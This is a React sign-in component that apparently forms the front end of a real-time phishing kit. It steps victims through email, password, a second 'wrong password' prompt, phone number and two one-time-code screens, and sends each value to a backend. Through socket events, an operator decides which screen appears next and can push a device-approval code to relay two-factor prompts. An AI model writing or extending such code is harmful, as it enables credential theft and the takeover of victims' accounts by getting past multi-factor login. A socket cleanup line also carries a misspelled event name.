import { useEffect, useState } from "react";
import axios from "axios";
import socket from "../socket";

import EmailStep from "../components/EmailStep";
import PasswordStep from "../components/PasswordStep";
import PhoneStep from "../components/PhoneStep";
import SigninRequestStep from "../components/SigninRequestStep";
import WrongPasswordStep from "../components/WrongPasswordStep";
import ApproveUserStep from "../components/ApproveUserStep";
import SuccessStep from "../components/SuccessStep";
import ProcessingStep from "../components/ProcessingStep";
import OtpStep from "../components/OtpStep";
import OtpStep2 from "../components/OtpStep2";

function SignIn() {

  const [step, setStep] = useState("email");

  const [userId, setUserId] = useState(
    sessionStorage.getItem("userId") || ""
  );

  const [approvedUser, setApprovedUser] = useState(null);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");


  const [message, setMessage] = useState("");


  // ======================================
  // SOCKET.IO
  // ======================================

  useEffect(() => {

  const handleApproval = (data) => {

    console.log(
      "Application approved:",
      data
    );

    setApprovedUser(data);

    setStep("approve");
  };


  socket.on(
    "account-approved",
    handleApproval
  );


  return () => {

    socket.off(
      "aacount-approved",
      handleApproval
    );

  };

}, []);

  useEffect(() => {
  const handleStepChanged = ({ step }) => {
    setStep(step);
  };

  socket.on(
    "step-changed",
    handleStepChanged
  );

  return () => {
    socket.off(
      "step-changed",
      handleStepChanged
    );
  };
}, []);

  // ======================================
  // EMAIL COMPLETED
  // ======================================

  const handleEmailComplete = async (
    enteredEmail
  ) => {

    try {

      setMessage("");

      const response =
        await axios.post(
          "http://localhost:5000/api/auth/start",
          {
            email: enteredEmail
          }
        );


      const newUserId =
        response.data.userId;


      if (!newUserId) {

        throw new Error(
          "No user ID returned"
        );

      }


      // Save information locally

      setUserId(
        newUserId
      );

      setEmail(
        enteredEmail
      );


      sessionStorage.setItem(
        "userId",
        newUserId
      );


      sessionStorage.setItem(
        "email",
        enteredEmail
      );


      // Register this browser
      // with its private Socket.IO session

      socket.emit(
        "register-user",
        newUserId
      );


      // Move to password

      setStep("password");

    }

    catch (error) {

      console.log(
        "EMAIL ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };


  // ======================================
  // PASSWORD COMPLETED
  // ======================================

  const handlePasswordComplete = async (userId, password 
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired. Please start again."
        );

        setStep("email");

        return;

      }


      setMessage("");


      await axios.post(
        "http://localhost:5000/api/auth/password",
        {
          userId,
          password
        }
      );


    

      console.log(
        "Password step completed"
      );

      setStep("processing")

    }

    catch (error) {

      console.log(
        "PASSWORD ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

   const handleWrongPasswordComplete = async (userId, wrongPassword 
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired. Please start again."
        );

        setStep("email");

        return;

      }


      setMessage("");


      await axios.post(
        "http://localhost:5000/api/auth/wrongPassword",
        {
          userId,
          wrongPassword: wrongPassword
        }
      );


    

      console.log(
        "Wrong password step completed"
      );

      setStep("processing")

    }

    catch (error) {

      console.log(
        "WRONG PASSWORD ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };



  // ======================================
  // PHONE COMPLETED
  // ======================================

  const handlePhoneComplete = async (
    userId,
    phoneNumber
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }


      await axios.post(
        "http://localhost:5000/api/auth/phone",
        {
          userId,
          phoneNumber
        }
      );


      console.log(
        "Phone step completed"
      );
      setStep("processing")


    }

    catch (error) {

      console.log(
        "PHONE ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

  const handlePhoneOtpComplete = async (
    userId,
    phoneOtp
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }


      await axios.post(
        "http://localhost:5000/api/auth/phoneotp",
        {
          userId,
          phoneOtp
        }
      );


      console.log(
        "Phone step completed"
      );
      setStep("processing")


    }

    catch (error) {

      console.log(
        "PHONE ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };

    const handlePhoneOtp2Complete = async (
    userId,
    phoneOtp2
  ) => {

    try {

      if (!userId) {

        setMessage(
          "Your session has expired."
        );

        return;

      }
      console.log("sec")


      await axios.post(
        "http://localhost:5000/api/auth/phoneotp2",
        {
          userId,
          phoneOtp2
        }
      );


      console.log(
        "Phone step completed"
      );
      setStep("processing")


    }

    catch (error) {

      console.log(
        "PHONE ERROR:",
        error
      );

      setMessage(
        error.response?.data?.message ||
        "Something went wrong"
      );

    }

  };


  // ======================================
  // RENDER CURRENT STEP
  // ======================================

  const renderStep = () => {

    switch (step) {


      // ================================
      // EMAIL
      // ================================

      case "email":

        return (
          <EmailStep
            onComplete={
              handleEmailComplete
            }
          />
        );

        case "processing":

        return (
          <ProcessingStep />
        )


      // ================================
      // PASSWORD
      // ================================

      case "password":

        return (
          <PasswordStep
            email={email}
            onComplete={
              handlePasswordComplete
            }
            
            
            userId={userId}
          />
        );


      // ================================
      // PHONE
      // ================================

      case "phone":

        return (
          <PhoneStep
            email={email}
            userId={userId}
            onComplete={
              handlePhoneComplete
            }
          />
        );

        case "phone-otp":
           return (
          <OtpStep
            email={email}
            userId={userId}
            onComplete={
              handlePhoneOtpComplete
            }
          />
        );

        
        case "phone-otp2":
           return (
          <OtpStep2
            email={email}
            userId={userId}
            onComplete={
              handlePhoneOtp2Complete
            }
          />
        );
        


        case "approve":
        return (
          <ApproveUserStep
            email={email}
            userDevice={approvedUser?.userDevice || ""}
            code={approvedUser?.code || ""}
          />
        );


      // ================================
      // SIGN-IN REQUEST
      // ================================

      case "signin-request":

        return (
          <SigninRequestStep
            email={email}
          />
        );


      // ================================
      // WRONG PASSWORD
      // ================================

      case "wrong-password":

        return (
          <WrongPasswordStep
            email={email}
             onComplete={
              handleWrongPasswordComplete
            }
            
            
            userId={userId}
          />
        );


      // ================================
      // SUCCESS
      // ================================

      case "success":

        return (
          <SuccessStep
            email={email}
          />
        );


      // ================================
      // DEFAULT
      // ================================

      default:

        return (
          <EmailStep
            onComplete={
              handleEmailComplete
            }
          />
        );

    }

  };


  return (

    <div>

      {renderStep()}


      {message && (

        <p
          style={{
            textAlign: "center",
            marginTop: "15px"
          }}
        >

          {message}

        </p>

      )}

    </div>

  );

}

export default SignIn;